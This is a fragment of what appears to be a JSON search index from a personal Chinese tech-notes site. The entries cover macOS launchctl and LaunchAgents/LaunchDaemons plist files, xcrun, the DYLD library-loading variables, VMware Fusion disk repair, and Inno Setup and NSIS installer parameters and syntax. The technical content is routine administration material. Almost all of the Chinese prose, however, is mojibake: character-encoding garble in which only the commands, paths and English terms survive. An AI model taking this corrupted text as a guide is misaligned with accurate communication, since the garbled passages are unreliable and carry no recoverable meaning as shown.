çš„æ–¹å¼å¯ä»¥è®¾ç½®ç¨‹åºéšæœºå¯åŠ¨ï¼Œ è€Œæ˜¯ä½¿ç”¨ plist æ–‡ä»¶ç®¡ç†. ä½ å¯ä»¥å†™ä¸€ä¸ªplistæ–‡ä»¶æ”¾åˆ° ~/Library/Launch Agents/ ä¸‹é¢ï¼Œ æ–‡ä»¶é‡Œæè¿°ä½ çš„ç¨‹åºè·¯å¾„å’Œå¯åŠ¨å‚æ•°ï¼Œ é‚£ä¹ˆè¿™ä¸ªç”¨æˆ·ç™»å½•æ—¶å°±ä¼šå¯åŠ¨è¿™ä¸ªç¨‹åºäº†ï¼Œè€Œä¸”æ˜¯æ€ä¸äº†çš„ï¼Œè¢«æ€äº†ä¹‹åä¼šè‡ªåŠ¨é‡æ–°å¯åŠ¨ plistæ–‡ä»¶åˆ†å¸ƒåœ¨: /System/Library/LaunchDaemons/ System-wide daemons provided by OS X å…¶ä¸­ apacheçš„httpdç¨‹åºå¯åŠ¨é…ç½®æ–‡ä»¶ org.apache.httpd.plist å°±åœ¨è¿™é‡Œã€‚ /System/Library/LaunchAgents/ ç”±Mac OS Xä¸ºç”¨æˆ·å®šä¹‰çš„ä»»åŠ¡é¡¹ /Library/LaunchDaemons ç”±ç®¡ç†å‘˜å®šä¹‰çš„å®ˆæŠ¤è¿›ç¨‹ä»»åŠ¡é¡¹ /Library/LaunchAgents ç”±ç®¡ç†å‘˜ä¸ºç”¨æˆ·å®šä¹‰çš„ä»»åŠ¡é¡¹ å¦‚æœæ”¾åˆ°/Library/Launch Agents/ä¸‹é¢çš„è¯ï¼Œå°±æ˜¯ä¸€å¼€æœºå°±å¯åŠ¨ ~/Library/LaunchAgents ç”±ç”¨æˆ·è‡ªå·±å®šä¹‰çš„ä»»åŠ¡ è¿™äº›é…ç½®æ–‡ä»¶ç”±ç¨‹åº launchctl è®¾ç½®æ˜¯å¦åŠ è½½ è¯´æ˜ launchctl ç®¡ç† MacOS çš„å¯åŠ¨è„šæœ¬ï¼Œæ§åˆ¶å¯åŠ¨è®¡ç®—æœºæ—¶éœ€è¦å¼€å¯çš„æœåŠ¡. ä¹Ÿå¯ä»¥è®¾ç½®å®šæ—¶æ‰§è¡Œç‰¹å®šä»»åŠ¡çš„è„šæœ¬ï¼Œå°±åƒLinux cron </docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/crond> ä¸€æ ·. launchctléœ€è¦rootæƒé™ã€‚ å¸¸ç”¨å‘½ä»¤ æ˜¾ç¤ºå½“å‰çš„å¯åŠ¨è„šæœ¬: launchctl list å¼€æœºæ—¶è‡ªåŠ¨å¯åŠ¨ApacheæœåŠ¡å™¨: sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist è®¾ç½®å¼€æœºå¯åŠ¨å¹¶ç«‹å³å¯åŠ¨æ”¹æœåŠ¡: launchctl load -w **.pist è®¾ç½®å¼€æœºå¯åŠ¨ä½†ä¸ç«‹å³å¯åŠ¨æœåŠ¡: launchctl load **.pist åœæ­¢æ­£åœ¨è¿è¡Œçš„å¯åŠ¨è„šæœ¬: sudo launchctl unload [path/to/script] å†åŠ ä¸Š-wé€‰é¡¹å³å¯å»é™¤å¼€æœºå¯åŠ¨: sudo launchctl unload -w [path/to/script] æ‰§è¡Œå®šæ—¶è„šæœ¬|è®¾ç½®å¼€æœºå¯åŠ¨æ­¥éª¤: 1. å†™æ‰§è¡Œè„šæœ¬ ï¼ˆé€šè¿‡ brew å®‰è£…è½¯ä»¶ brew ä¼šä¸ºæˆ‘ä»¬è‡ªåŠ¨ç”Ÿæˆã€‚ï¼‰ 2. å»å¯¹åº”çš„ç›®å½•ä¸‹å»ºç«‹plistæ–‡ä»¶ 3. åŠ è½½æœåŠ¡ > 1 cd è¿›å…¥æŒ‡å®š plist æ–‡ä»¶ç›®å½• > 2 launchctl load *.plist #åŠ è½½ launchctl unload *.plist #å–æ¶ˆ > 3 launchctl list #æŸ¥çœ‹æœåŠ¡ è¿˜å¯è®¾ç½®åˆ«åä¾¿äºæ“ä½œ: 1. vim ~/.bash_profile #ç¼–è¾‘æ·»åŠ å¦‚ä¸‹è„šæœ¬ 2. å‘½ååˆ«åï¼ˆä»¥ nginx ä¸ºä¾‹ï¼‰ > å¯åŠ¨ï¼šalias nginx.start='launchctl load -w ~/Library/LaunchAgents/homebrew.mxcl.nginx.plist' > å…³é—­ï¼šalias nginx.stop='launchctl unload -w ~/Library/LaunchAgents/homebrew.mxcl.nginx.plist' > é‡å¯ï¼šalias nginx.restart='nginx.stop && nginx.start' æ³¨è§£ åœ¨launchctl list å‘½ä»¤ç»“æœä¸­å‡ºç°çš„ plist æ–‡ä»¶æ‰ä¼šæœ‰æ•ˆ; Agentsæ–‡ä»¶å¤¹ä¸‹çš„plistæ˜¯éœ€è¦ç”¨æˆ·ç™»å½•åï¼Œæ‰ä¼šåŠ è½½çš„ï¼Œ è€ŒDaemonsæ–‡ä»¶å¤¹ä¸‹å¾—plistæ˜¯åªè¦å¼€æœºï¼Œå¯ä»¥ä¸ç”¨ç™»å½•å°±ä¼šè¢«åŠ è½½ å‚è€ƒ: MacOS launchctl å¯åŠ¨è¿›ç¨‹æ§åˆ¶ ç”¨ä¾‹-æŸ¥æ‰¾dockerè¿›ç¨‹å¹¶å…³é—­ listæŸ¥æ‰¾ç„¶åå…³é—­å’Œå¯åŠ¨å®ƒ: $ launchctl list | grep docker 111117 0 com.docker.docker.2388 $ launchctl stop com.docker.docker.2388 && launchctl start com.docker.docker.2388","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-launchctl.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-launchctl.html"},{"title":"xcrun","text":"æŸ¥çœ‹sdkè·¯å¾„: $ xcrun --sdk macosx --show-sdk-path /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX14.2.sdk","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-xcrun.html","loc":"/yq-doc-source-docs-operating-system-Mac-MAC-instruction-xcrun.html"},{"title":"DYLD_INSERT_LIBRARIES","text":"å¯ä»¥ç”¨æ¥æ‰§è¡Œç¨‹åºè¿è¡Œå‰é¦–å…ˆåŠ è½½çš„åŠ¨æ€åº“, å¤šä¸ªä½¿ç”¨å†’å·åˆ†å‰², ä¸Linuxçš„ /docs/æ“ä½œç³»ç»Ÿ/linux/Linuxç¯å¢ƒå˜é‡/LD_PRELOAD åŸºæœ¬ä¸€è‡´","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-Mac-environment-variable-Dyld_insert_libraries.html","loc":"/yq-doc-source-docs-operating-system-Mac-Mac-environment-variable-Dyld_insert_libraries.html"},{"title":"DYLD_PRINT_LIBRARIES","text":"è®¾ç½®å€¼ä¸º1å, æ‰§è¡Œç¨‹åºä¹‹å‰ä¼šæ‰“å°å‡ºè¿è¡Œæ—¶åŠ è½½çš„æ‰€æœ‰åŠ¨æ€åº“ ç”¨ä¾‹: $ DYLD_PRINT_LIBRARIES=1 ./test2 // è¿™éƒ¨åˆ†æ˜¯è¿è¡Œæ—¶åŠ è½½çš„åŠ¨æ€åº“, ç¯‡å¹…è¾ƒé•¿, æ­¤å¤„åªæˆªå–å¤´å°¾ dyld[43741]: <DD3BA6F6-FA28-3A28-AA7D-F95D176C25B3> /Users/yanque/project/code/TryTest/test2 dyld[43741]: <683DEB82-6E72-394B-945D-AB3A1A8BE1D8> /Users/yanque/project/code/TryTest/libtest2preutil.dylib ... dyld[43741]: <6F11E645-DB1C-325D-AC28-91740663E4DD> /usr/lib/system/libxpc.dylib dyld[43741]: <7E3B4177-738A-305C-93AA-D9E395B96B9D> /usr/lib/libobjc.A.dylib dyld[43741]: <87B41A1F-8387-3AF3-BB41-C86D4B6A21A5> /usr/lib/liboah.dylib // ä¸‹é¢æ˜¯æ‰§è¡Œç»“æœ a + b + éšæœºå€¼= 10000 + 10090 + 3 = 0 äº¤æ¢a, bçš„å€¼, äº¤æ¢å‰: a: 10000; b: 10090 äº¤æ¢a, bçš„å€¼, äº¤æ¢å: a: 10090; b: 10000","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-Mac-environment-variable-Dyld_print_libraries.html","loc":"/yq-doc-source-docs-operating-system-Mac-Mac-environment-variable-Dyld_print_libraries.html"},{"title":"Mac-Vmwareç£ç›˜ä¿®å¤","text":"Macä¸‹é¢ä¸ªäººå…è´¹çš„è™šæ‹Ÿæœºå¥½åƒåªæœ‰Vmwareçš„ Vmware Fusion , æœ‰æ—¶å€™ç”±äºç£ç›˜ç©ºé—´ä¸è¶³å•Šç­‰åŸå› å¯èƒ½ä¼š é€ æˆ æŒ‡å®šçš„è™šæ‹Ÿç£ç›˜éœ€è¦ä¿®å¤ è¿™ä¸ªæ—¶å€™å¥½åƒé‡å¯Vmwareå°±å¯ä»¥ä¿®å¤. è‹¥ä¸è¡Œ: cd /Applications/VMware\\ Fusion.app/Contents/Library/ ./vmware-vdiskmanager -R \"/Users/yanque/Virtual Machines.localized/Ubuntu 64 ä½ 14.04.6.vmwarevm/è™šæ‹Ÿç£ç›˜.vmdk\"","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-Mac-vmware-disk-repair.html","loc":"/yq-doc-source-docs-operating-system-Mac-Mac-vmware-disk-repair.html"},{"title":"æ‰“å°è¿è¡Œæ—¶åŠ è½½çš„åŠ¨æ€åº“","text":"è¿è¡Œå‰è®¾ç½®ç¯å¢ƒå˜é‡ DYLD_PRINT_LIBRARIES=1 è¯¦è§: /docs/æ“ä½œç³»ç»Ÿ/Mac/Macç¯å¢ƒå˜é‡/DYLD_PRINT_LIBRARIES","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Mac-The-dynamic-library-loaded-when-printing-runtime.html","loc":"/yq-doc-source-docs-operating-system-Mac-The-dynamic-library-loaded-when-printing-runtime.html"},{"title":"å…³äºå®‰å“æ¨¡æ‹Ÿå™¨ä¸WSLå†²çª","text":"å‚è€ƒ:: https://blog.csdn.net/weixin_42474261/article/details/125396451 https://www.zhihu.com/question/264353707 wsl Hyper-V ä¸ å®‰å“æ¨¡æ‹Ÿå™¨è™šæ‹ŸæœºåŒæ—¶å…±å­˜æ–¹æ¡ˆ å†²æµªäº†ä¸€ä¸‹å¤§æ¦‚å°±å‡ ç§æ–¹æ¡ˆ: æœ€æ–°çš„é›·ç”µ9å·²ç»è§£å†³äº†å…¼å®¹æ€§é—®é¢˜, æ”¯æŒå…±å­˜. å‚è€ƒ: wsl Hyper-V ä¸ å®‰å“æ¨¡æ‹Ÿå™¨è™šæ‹ŸæœºåŒæ—¶å…±å­˜æ–¹æ¡ˆ ä¸‹è½½æ–°ç‰ˆ BlueStacks (è“å ) å›½é™…ç‰ˆ. ä¸‹è½½åœ°å€: BlueStacksFullInstaller_5.9.410.1001_amd64_native","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-About-Android-simulator-conflict-with-WSL.html","loc":"/yq-doc-source-docs-operating-system-Windows-About-Android-simulator-conflict-with-WSL.html"},{"title":"innosetupæ„å»ºåŒ…","text":"githubåœ°å€:: jrsoftware/issrc innosetup æ˜¯é€‚ç”¨äºwindowsçš„ä¸€ä¸ªå…è´¹windowså®‰è£…ç¨‹åºåˆ¶ä½œè½¯ä»¶. å¯¹äºæ‰“å¥½çš„åŒ…, æ”¯æŒä¸å…³é—­åº”ç”¨ç¨‹åºçš„é™é»˜å®‰è£…ç­‰æ“ä½œ. é…ç½®è„šæœ¬ innosetup æ”¯æŒçš„é…ç½®æ–‡ä»¶ä¸º iss åç¼€çš„æ–‡ä»¶. çœ‹åˆ°ä¸€ä¸ªæ¯”è¾ƒæ–°çš„ä¸­æ–‡çš„é…ç½®æ•™ç¨‹: Inno Setupæ‰“åŒ…ç¨‹åº æˆªå–äº†éƒ¨åˆ†: innosetup_code_example æ”¯æŒçš„é…ç½®: [Setup] section [Setup] section directives [Types] section [Components] section [Tasks] section [Dirs] section [Files] section [Icons] section [INI] section [InstallDelete] section [Languages] section [Messages] section [CustomMessages] section [LangOptions] section [Registry] section [Run] section [UninstallDelete] section [UninstallRun] section è¯¦æƒ…è§å®˜ç½‘: setup script sections <https://jrsoftware.org/ishelp/index.php?topic=consts> è‡ªå®šä¹‰é…ç½®ä»£ç  è‹¥éœ€è¦åŠ ä»£ç ä¹‹ç±», éœ€è¦å¢åŠ  [code] å°èŠ‚, åœ¨å…¶ä¸­ç¼–ç , æ”¯æŒè®¾ç½®è‡ªå·±çš„å‚æ•°. å¦‚, vscodeè‡ªå®šä¹‰äº†ä¸€ä¸ª /update å‚æ•°, ä½¿ç”¨æ—¶å€™ä¼ å…¥æ ‡å¿—æ–‡ä»¶è·¯å¾„: VSCodeUserSetup-x64-1.76.0.exe /verysilent /update=VSCodeUserSetup-x64-1.76.0.flag /nocloseapplications /mergetasks=runcode,!desktopicon,!quicklaunchicon åœ¨ä»£ç ä¸­è·å– /update çš„å‚æ•°, è·å–ä¸åˆ°åˆ™ä¸º false '{param:update|false}' codeéƒ¨åˆ†ç¼–ç è¯­è¨€å‚è€ƒ Pascal (ä¸Šå¤è¯­è¨€) å®‰è£…åŒ…é»˜è®¤æ”¯æŒçš„å‚æ•° å®˜ç½‘åœ°å€:: Setup Command Line Parameters å¯¹äºæ„å»ºå¥½çš„åŒ…, å¯åŠ¨æ—¶æ”¯æŒå‚æ•°: /silent é™é»˜å®‰è£…ï¼Œä½†å¦‚æœåˆæŠ¥é”™ï¼Œè¿˜æ˜¯ä¼šæç¤ºï¼Œå¹¶ä¸”æœ‰è¿›åº¦æ¡ /verysilent å¼ºåˆ¶é™é»˜å®‰è£…ï¼Œä¸ç®¡æ˜¯å¦æŠ¥é”™ï¼Œéƒ½ä¸ä¼šæœ‰ä»»ä½•æç¤º(æ³¨æ„ï¼šå¦‚æœéœ€è¦é‡å¯ç”µè„‘ï¼Œå®ƒä¼šä¸æç¤ºè€Œç›´æ¥é‡å¯) /suppressmsgboxes ç”± suppress(æŠ‘åˆ¶ï¼Œé•‡å‹) å’Œ msgboxes(æ¶ˆæ¯æ¡†)ï¼Œç»„æˆï¼Œè¡¨ç¤ºä¸æç¤ºæ¶ˆæ¯æ¡† /norestart ç»“åˆ /verysilent ä½¿ç”¨ï¼Œé¿å…æ— æç¤ºç›´æ¥é‡å¯ /HELP, /? æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ /SP- éšè—å®‰è£…æç¤ºä¿¡æ¯(setup prompt) /ALLUSERS ç®¡ç†å‘˜èº«ä»½å®‰è£… /CURRENTUSER éç®¡ç†å‘˜èº«ä»½å®‰è£… /LOG=\"filename\" åˆ›å»ºå®‰è£…æ—¥å¿—æ–‡ä»¶. å¯ä¸å¸¦å‚æ•°, åˆ™åœ¨ç”¨æˆ·çš„ Temp ç›®å½•ä¸‹åˆ›å»ºæ—¥å¿—æ–‡ä»¶, debugçš„æ—¶å€™ç”¨å¤„å¤§ /TASKS=\"comma separated list of task names\" æ‰§è¡Œå®šä¹‰çš„task /MERGETASKS=\"comma separated list of task names\" è²Œä¼¼äºä¸Šä¸€ä¸ªä¸€æ · ... å…¶ä»–è§å®˜ç½‘ é™„ä»¶ innosetup é…ç½®è„šæœ¬ä¾‹ ä¸€äº›æœ‰ç‚¹ç”¨çš„æ–‡æ¡£, ä¸»è¦æ˜¯è¿˜æ²¡æ¥å¾—åŠçœ‹, å…ˆè®°å½•: pythoné¡¹ç›®æ„å»º: Python_Project_nuitka_inno_setup inno setupæŠ€å·§ç¯‡ è½¯ä»¶exeæ‰“åŒ…å‹ç¼©å¸¸ç”¨é™é»˜å®‰è£…å‚æ•° å¸¸ç”¨è½¯ä»¶çš„é™é»˜å®‰è£…å‚æ•°ï¼ŒåŒå‡»è‡ªåŠ¨å®‰è£… å¸¸ç”¨è½¯ä»¶æ‰“åŒ…ç±»å‹åŠé™é»˜å®‰è£…å‚æ•°","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-InnOSetup-builds-a-package.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-InnOSetup-builds-a-package.html"},{"title":"NSIS å†…ç½®å‡½æ•°","text":"GetTimeè·å–æ—¶é—´ æœ‰9ä¸ªå‚æ•°, è·å–å½“å‰æœ¬åœ°æ—¶é—´æˆ–è€…æ–‡ä»¶æ—¶é—´. è¯­æ³•: ${GetTime} \"[File]\" \"[Option]\" $var1 $var2 $var3 $var4 $var5 $var6 $var7 \"[File]\" ; Ignored if \"L\" or \"LS\" ; \"[Option]\" ; [Options] ; L Local time ; A last Access file time ; C Creation file time ; M Modification file time ; LS System time (UTC) ; AS last Access file time (UTC) ; CS Creation file time (UTC) ; MS Modification file time (UTC) ; $var1 ; Result1: day $var2 ; Result2: month $var3 ; Result3: year $var4 ; Result4: day of week name $var5 ; Result5: hour $var6 ; Result6: minute $var7 ; Result7: seconds eg: Section ${GetTime} \"\" \"L\" $0 $1 $2 $3 $4 $5 $6 ; $0=\"01\" day ; $1=\"04\" month ; $2=\"2005\" year ; $3=\"Friday\" day of week name ; $4=\"16\" hour ; $5=\"05\" minute ; $6=\"50\" seconds MessageBox MB_OK 'Date=$0/$1/$2 ($3)$\\nTime=$4:$5:$6' SectionEnd","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Built--in-function.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Built--in-function.html"},{"title":"å¸¸ç”¨å¤´æ–‡ä»¶","text":"MUI.nsh Modern User Interface æ˜¯NSISè„šæœ¬ä¸­ä¸€ä¸ªéå¸¸å¸¸ç”¨çš„å¤´æ–‡ä»¶ï¼Œå®ƒæä¾›äº†ä¸€ç³»åˆ—ç°ä»£åŒ–çš„ç”¨æˆ·ç•Œé¢å…ƒç´ ï¼Œ åŒ…æ‹¬ç®€å•æ˜“ç”¨çš„å®‰è£…å‘å¯¼ã€æ§ä»¶å’Œé¡µé¢ã€‚ä½¿ç”¨\"MUI.nsh\"å¯ä»¥è½»æ¾åœ°åˆ›å»ºå…·æœ‰ç°ä»£é£æ ¼çš„å®‰è£…ç¨‹åºï¼Œè€Œæ— éœ€ç¼–å†™å¤æ‚çš„ä»£ç ã€‚ å¸¸ç”¨çš„æŒ‡ä»¤: !insertmacro MUI_PAGE_WELCOMEï¼šæ·»åŠ æ¬¢è¿é¡µé¢ã€‚ !insertmacro MUI_PAGE_LICENSEï¼šæ·»åŠ è®¸å¯è¯åè®®é¡µé¢ã€‚ !insertmacro MUI_PAGE_DIRECTORYï¼šæ·»åŠ é€‰æ‹©å®‰è£…ä½ç½®é¡µé¢ã€‚ !insertmacro MUI_PAGE_INSTFILESï¼šæ·»åŠ æ–‡ä»¶å®‰è£…è¿›åº¦é¡µé¢ã€‚ !insertmacro MUI_PAGE_FINISHï¼šæ·»åŠ å®‰è£…å®Œæˆé¡µé¢ã€‚ !insertmacro MUI_LANGUAGEï¼šè®¾ç½®å®‰è£…ç¨‹åºçš„è¯­è¨€ã€‚ å¦‚è®¾ç½®å®‰è£…è¯­è¨€ä¸ºè‹±æ–‡: !insertmacro MUI_LANGUAGE \"English\" è®¾ç½®ä¸ºä¸­æ–‡: !insertmacro MUI_LANGUAGE \"SimpChinese\"","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Common-header-file.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Common-header-file.html"},{"title":"å¯æ‰§è¡Œæ–‡ä»¶é€‰é¡¹","text":"æ­¤å¤„çš„å¯æ‰§è¡Œæ–‡ä»¶æŒ‡çš„æ˜¯: ä½¿ç”¨ NSIS è„šæœ¬æ‰“åŒ…å¥½çš„exeå¯æ‰§è¡Œæ–‡ä»¶ ä¸€äº›å®‰è£…å‚æ•° æ³¨æ„, æ˜¯å¯¹äºæ‰“åŒ…å¥½çš„exeå®‰è£…åŒ…è€Œè¨€: /NCRC å®‰è£…å‰æ˜¾ç¤ºéªŒè¯æ•°æ®å®Œæ•´æ€§, ä¸è„šæœ¬å†…ä½¿ç”¨ CRCCheck on æ•ˆæœä¸€è‡´ /S é™é»˜å®‰è£…(æˆæƒå•¥çš„è¿˜æ˜¯ä¼šæœ‰æç¤º) /D=<dir> æŒ‡å®šå®‰è£…ç›®å½• (è¿™ä¸ªå®æµ‹æ²¡æ•ˆæœ) è®¾ç½®é»˜è®¤å®‰è£…ç›®å½•: $INSTDIR, ä¼šè¦†ç›–æ‰ InstallDir å’Œ InstallDirRegKey è‹¥ä½¿ç”¨, å¿…é¡»æ˜¯æœ€åä¸€ä¸ªå‚æ•°, ä»…æ”¯æŒç»å¯¹è·¯å¾„, ä¸èƒ½ä½¿ç”¨å¼•å·(å³ä½¿æœ‰ç©ºæ ¼) è¡¥å……ä¸€ä¸‹å½“æ—¶å®æµ‹æ²¡æ•ˆæœæ˜¯å› ä¸º, /Dé»˜è®¤ä¼šè¦†ç›–æ‰InstallDir, ç”Ÿæ•ˆä¸ `onInit` å‰, ä½†æ˜¯æˆ‘æµ‹è¯•é‚£ä¸ªè„šæœ¬åœ¨ `onInit` åˆæŒ‡å®šäº†ä¸€ä¸‹ `INSTDIR` , åˆè¦†ç›–äº† `/D` çš„, æ‰€ä»¥å¤±æ•ˆ. # /help, /? æ‰“å°å¸®åŠ©æ–‡æ¡£ (è¿™ä¸ªå®æµ‹ä¹Ÿæ²¡æ•ˆæœ) å®˜æ–‡æ¡£æ²¡çœ‹åˆ°æœ‰äº›... å¸è½½æ—¶å€™çš„ç‰¹æ®Šå‚æ•°: _?=<dir> è®¾ç½® $INSTDIR , æŒ‡å®šä»è¿™ä¸ªä½ç½®è§£å‹ å¿…é¡»æ˜¯æœ€åçš„å‚æ•°, ä¸èƒ½åŒ…å«å¼•å·(å³ä½¿æœ‰ç©ºæ ¼)","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Executable-file-options.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Executable-file-options.html"},{"title":"è¯­æ³•è§„èŒƒ","text":"æ³¨é‡Š æ³¨é‡Š, ä½¿ç”¨ # æˆ–è€… ; å¯¼å…¥å…¶ä»–è„šæœ¬ å¼•å…¥è‡ªå®šä¹‰è„šæœ¬æ–‡ä»¶, ä½¿ç”¨ !include !include xxx.nsh ä½¿ç”¨dllæ¨¡å— ä½¿ç”¨dllæä¾›çš„å‡½æ•°: plugin::command [parameters] ä¸æ­¢dll, å…¶ä»–è‡ªå®šä¹‰æ¨¡å—ä¹Ÿè¡Œ. ä¸è¿‡éƒ½éœ€è¦å…ˆ å¯¼å…¥å…¶ä»–è„šæœ¬ , ä½¿ç”¨: nsExec::Exec \"myfile\" å˜é‡ è‡ªå®šä¹‰ è¯­æ³•(è²Œä¼¼å¤§å°å†™çš†å¯): Var [/GLOBAL] var_name å˜é‡å®šä¹‰, ä½¿ç”¨ Var : Var xxx æ³¨æ„å®šä¹‰çš„å˜é‡å…¨éƒ¨éƒ½æ˜¯å…¨å±€å˜é‡, è‹¥å®šä¹‰åœ¨å‡½æ•°å†…éƒ¨, å¿…é¡»ä½¿ç”¨ /GLOBAL ä¿®é¥°: Var /GLOBAL xxx è¿˜å¯ä»¥ä½¿ç”¨define !define var_name \"var_str\" ä½¿ç”¨defineå®šä¹‰çš„å˜é‡åªè¯», å¯åœ¨å½“å‰è„šæœ¬å…¨å±€ä½¿ç”¨. é¢„å®šä¹‰ å¯„å­˜å™¨å˜é‡(ç”¨äºå‚æ•°ä¼ é€’): $0, $1, $2, $3, $4, $5, $6, $7, $8, $9 $R0, $R1, $R2, $R3, $R4, $R5, $R6, $R7, $R8, $R9 # ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯å‘½ä»¤è¡Œå‚æ•°, çœ‹äº†ä¸€ä¸‹ä»…æ˜¯é¢„å®šä¹‰çš„ä¸€äº›å˜é‡, åªæ˜¯ä¸ç”¨æ˜¾ç¤ºå£°æ˜è€Œå·² å¯å˜é¢„å®šä¹‰å˜é‡: $INSTDIR ç¨‹åºå®‰è£…è·¯å¾„, å¯ä»¥ä½¿ç”¨ StrCpy, ReadRegStr, ReadINIStr, etc ä¿®æ”¹ $OUTDIR å½“å‰è¾“å‡ºç›®å½• $CMDLINE å®‰è£…æ—¶å€™çš„å‘½ä»¤è¡Œå‚æ•°, ä¸ºæ•´ä¸ªå‘½ä»¤è¡Œ, å¦‚: xxx.exe parameter1 parameter2 ... è‹¥éœ€è¦è·å–å…¶ä¸­çš„å‚æ•°, ä½¿ç”¨ GetParameters (é’ˆå¯¹æ™®é€šå‚æ•°) , GetOptions (é’ˆå¯¹é€‰é¡¹å‚æ•°) . è§ è·å–å‘½ä»¤è¡Œå‚æ•°_ å½“å‘½ä»¤è¡Œå­˜åœ¨ ``/D`` é€‰é¡¹å‚æ•°æ—¶, ``$CMDLINE`` ä¸ºç©º. $LANGUAGE å½“å‰ä½¿ç”¨çš„è¯­è¨€ ç³»ç»Ÿå˜é‡ ç³»ç»Ÿå˜é‡: $PROGRAMFILES ç¨‹åºæ–‡ä»¶ç›®å½•(é€šå¸¸ä¸º C:\\Program Files ä½†æ˜¯è¿è¡Œæ—¶ä¼šæ£€æµ‹). $COMMONFILES å…¬ç”¨æ–‡ä»¶ç›®å½•ã€‚è¿™æ˜¯åº”ç”¨ç¨‹åºå…±äº«ç»„ä»¶çš„ç›®å½•(é€šå¸¸ä¸º C:\\Program Files\\Common Files ä½†æ˜¯è¿è¡Œæ—¶ä¼šæ£€æµ‹). $DESKTOP Windows æ¡Œé¢ç›®å½•(é€šå¸¸ä¸º C:\\windows\\desktop ä½†æ˜¯è¿è¡Œæ—¶ä¼šæ£€æµ‹)ã€‚è¯¥å¸¸é‡çš„å†…å®¹(æ‰€æœ‰ç”¨æˆ·æˆ–å½“å‰ç”¨æˆ·)å–å†³äº SetShellVarContext è®¾ç½®ã€‚é»˜è®¤ä¸ºå½“å‰ç”¨æˆ·ã€‚ $EXEDIR å®‰è£…ç¨‹åºè¿è¡Œæ—¶çš„ä½ç½®ã€‚(ä»æŠ€æœ¯ä¸Šæ¥è¯´ä½ å¯ä»¥ä¿®æ”¹æ”¹å˜é‡, ä½†å¹¶ä¸æ˜¯ä¸€ä¸ªå¥½æ–¹æ³•). ${NSISDIR} åŒ…å« NSIS å®‰è£…ç›®å½•çš„ä¸€ä¸ªæ ‡è®°ã€‚åœ¨ç¼–è¯‘æ—¶ä¼šæ£€æµ‹åˆ°ã€‚å¸¸ç”¨äºåœ¨ä½ æƒ³è°ƒç”¨ä¸€ä¸ªåœ¨ NSIS ç›®å½•ä¸‹çš„èµ„æºæ—¶, ä¾‹å¦‚: å›¾æ ‡ã€ç•Œé¢â€¦â€¦ $WINDIR Windows ç›®å½•(é€šå¸¸ä¸º C:\\windows æˆ– C:\\winnt ä½†åœ¨è¿è¡Œæ—¶ä¼šæ£€æµ‹) $SYSDIR Windows ç³»ç»Ÿç›®å½•(é€šå¸¸ä¸º C:\\windows\\system æˆ– C:\\winnt\\system32 ä½†åœ¨è¿è¡Œæ—¶ä¼šæ£€æµ‹) $TEMP ç³»ç»Ÿä¸´æ—¶ç›®å½•(é€šå¸¸ä¸º C:\\windows\\temp ä½†åœ¨è¿è¡Œæ—¶ä¼šæ£€æµ‹) $STARTMENU å¼€å§‹èœå•ç›®å½•(å¸¸ç”¨äºæ·»åŠ ä¸€ä¸ªå¼€å§‹èœå•é¡¹, ä½¿ç”¨ CreateShortCut)ã€‚è¯¥å¸¸é‡çš„å†…å®¹(æ‰€æœ‰ç”¨æˆ·æˆ–å½“å‰ç”¨æˆ·)å–å†³äº SetShellVarContext è®¾ç½®ã€‚é»˜è®¤ä¸ºå½“å‰ç”¨æˆ·ã€‚ $SMPROGRAMS å¼€å§‹èœå•ç¨‹åºç›®å½•(å½“ä½ æƒ³å®šä½ $STARTMENU\\ç¨‹åº æ—¶å¯ä»¥ä½¿ç”¨å®ƒ)ã€‚è¯¥å¸¸é‡çš„å†…å®¹(æ‰€æœ‰ç”¨æˆ·æˆ–å½“å‰ç”¨æˆ·)å–å†³äº SetShellVarContext è®¾ç½®ã€‚é»˜è®¤ä¸ºå½“å‰ç”¨æˆ·ã€‚ $SMSTARTUP å¼€å§‹èœå•ç¨‹åº/å¯åŠ¨ ç›®å½•ã€‚è¯¥å¸¸é‡çš„å†…å®¹(æ‰€æœ‰ç”¨æˆ·æˆ–å½“å‰ç”¨æˆ·)å–å†³äº SetShellVarContext è®¾ç½®ã€‚é»˜è®¤ä¸ºå½“å‰ç”¨æˆ·ã€‚ $QUICKLAUNCH åœ¨ IE4 æ´»åŠ¨æ¡Œé¢åŠä»¥ä¸Šçš„å¿«é€Ÿå¯åŠ¨ç›®å½•ã€‚å¦‚æœå¿«é€Ÿå¯åŠ¨ä¸å¯ç”¨, ä»…ä»…è¿”å›å’Œ $TEMP ä¸€æ ·ã€‚ $DOCUMENTS æ–‡æ¡£ç›®å½•ã€‚ä¸€ä¸ªå½“å‰ç”¨æˆ·å…¸å‹çš„è·¯å¾„å½¢å¦‚ C:\\Documents and Settings\\Foo\\My 